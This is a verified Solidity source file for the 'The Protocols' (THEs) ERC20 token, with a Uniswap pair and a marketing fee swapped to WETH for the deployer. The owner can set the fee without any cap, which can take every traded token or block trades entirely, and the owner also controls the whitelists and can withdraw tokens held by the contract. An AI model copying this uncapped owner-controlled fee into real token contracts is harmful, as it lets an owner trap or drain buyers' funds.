/**
 *Submitted for verification at Etherscan.io on 2022-10-17
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface ISwapPair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function sync() external;
    function token0() external view returns (address);
}
abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

abstract contract AbsToken is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    address public fundAddress;
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    mapping(address => bool) public _feeWhiteList;
    uint256 private _tTotal;
    ISwapRouter public _swapRouter;
    address public _fist;
    mapping(address => bool) public _swapPairList;
    bool private inSwap;
    uint256 private constant MAX = ~uint256(0);
    uint256 public _marketingFee = 600;
    uint256 public startTradeBlock;
    address public _mainPair;
    bool public backSwitch = true;

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (
        address RouterAddress, 
        string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply
    ){
        fundAddress = msg.sender;
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;
        ISwapRouter swapRouter = ISwapRouter(RouterAddress);
        _swapRouter = swapRouter;
        IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2).approve(RouterAddress, MAX);
        _allowances[address(this)][address(swapRouter)] = MAX;
        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address swapPair = swapFactory.createPair(address(this), 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
        _mainPair = swapPair;
        _swapPairList[swapPair] = true;
        uint256 total = Supply * 10 ** Decimals;
        _tTotal = total;
        _balances[msg.sender] = total;
        emit Transfer(address(0), msg.sender, total);
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[address(swapRouter)] = true;
        _feeWhiteList[msg.sender] = true;
    }
    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        uint256 balance = balanceOf(from);
        require(balance >= amount, "balanceNotEnough");
        bool takeFee;
        bool isSell;
        if (_swapPairList[from] || _swapPairList[to]) {
            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                if (_swapPairList[to] && backSwitch) {
                    if (!inSwap) {
                        uint256 contractTokenBalance = balanceOf(address(this));
                            swapTokenForFund(contractTokenBalance);
                    }
                }
                takeFee = true;
            }
            if (_swapPairList[to]) {
                isSell = true;
            }
        }
        _tokenTransfer(from, to, amount, takeFee);
    }
    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount;
        if (takeFee) {
            uint256 swapFee = _marketingFee;
            uint256 swapAmount = tAmount * swapFee / 10000;
            feeAmount += swapAmount;
            if (swapAmount > 0) {
                _takeTransfer(
                    sender,
                    address(this),
                    swapAmount
                );
            }
        }
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }
    function swapTokenForFund(uint256 tokenAmount) private lockTheSwap 
    {
        uint256 totalFee = _marketingFee;
        uint256 buyBackAmount = tokenAmount * _marketingFee/totalFee;
        _approve(address(this),address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D),buyBackAmount);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            buyBackAmount,
            0,
            path,
            fundAddress,
            block.timestamp
        );
    }
    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }
    function setMarketingFee(uint256 marketingFee) external onlyOwner {
        _marketingFee = marketingFee;
    }
    function setFeeWhiteList(address addr, bool enable) external onlyFunder {
        _feeWhiteList[addr] = enable;
    }
    function setBackSwitch(bool _backSwitch) external onlyOwner {
        backSwitch = _backSwitch;
    }
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }
    function setSwapPairList(address addr, bool enable) external onlyFunder {
        _swapPairList[addr] = enable;
    }
    function claimToken(address token, uint256 amount, address to) external onlyFunder {
        IERC20(token).transfer(to, amount);
    }
    modifier onlyFunder() {
        require(_owner == msg.sender, "!Funder");
        _;
    }
    receive() external payable {}
}
contract THEs is AbsToken {
    constructor() AbsToken(
        address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D),
        unicode"The Protocols",
        unicode"THEs",
        18,
        100000000
    ){
    }
}